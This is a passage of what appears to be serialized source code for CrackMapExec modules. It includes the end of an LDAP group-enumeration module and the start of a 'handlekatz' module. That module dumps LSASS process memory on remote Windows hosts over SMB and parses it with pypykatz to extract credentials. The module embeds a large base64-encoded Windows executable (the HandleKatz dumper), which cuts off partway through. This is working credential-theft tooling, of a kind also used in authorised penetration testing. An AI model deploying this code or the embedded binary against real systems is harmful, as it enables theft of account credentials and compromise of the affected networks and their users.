         # Reference: https://social.technet.microsoft.com/Forums/Azure/en-US/373febac-665c-494d-91f7-834541c74bee/cant-get-all-member-objects-from-domain-users-in-ldap?forum=winserverDS\n                        if str(primaryGroupID) == ""513"":\n                            memberOf.append(""CN=Domain Users,CN=Users,DC=XXXXX,DC=XXX"")\n                    elif str(attribute[""type""]) == ""memberOf"":\n                        for group in attribute[""vals""]:\n                            if isinstance(group._value, bytes):\n                                memberOf.append(str(group))\n\n            except Exception as e:\n                context.log.debug(""Exception:"", exc_info=True)\n                context.log.debug(""Skipping item, cannot process due to error %s"" % str(e))\n                pass\n        if len(memberOf) > 0:\n            context.log.success(""User: {} is member of following groups: "".format(self.user))\n            for group in memberOf:\n                # Split the string on the "","" character to get a list of the group name and parent group names\n                group_parts = group.split("","")\n\n                # The group name is the first element in the list, so we can extract it by taking the first element of the list\n                # and splitting it on the ""="" character to get a list of the group name and its prefix (e.g., ""CN"")\n                group_name = group_parts[0].split(""="")[1]\n\n                # print(""Group name: %s"" % group_name)\n                context.log.highlight(""{}"".format(group_name))\n', 'handlekatz.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# handlekatz module for CME python3\n# author of the module : github.com/mpgn\n# HandleKatz: https://github.com/codewhitesec/HandleKatz\n\nimport base64\nimport re\nimport sys\n\nfrom cme.helpers.bloodhound import add_user_bh\n\n\nclass CMEModule:\n    name = ""handlekatz""\n    description = ""Get lsass dump using handlekatz64 and parse the result with pypykatz""\n    supported_protocols = [""smb""]\n    opsec_safe = False\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        TMP_DIR             Path where process dump should be saved on target system (default: C:\\\\Windows\\\\Temp\\\\)\n        HANDLEKATZ_PATH       Path where handlekatz.exe is on your system (default: /tmp/)\n        HANDLEKATZ_EXE_NAME   Name of the handlekatz executable (default: handlekatz.exe)\n        DIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = HANDLEKATZ_PATH)\n        """"""\n\n        self.tmp_dir = ""C:\\\\Windows\\\\Temp\\\\""\n        self.share = ""C$""\n        self.tmp_share = self.tmp_dir.split("":"")[1]\n        self.handlekatz_embeded = base64.b64decode(\n            ""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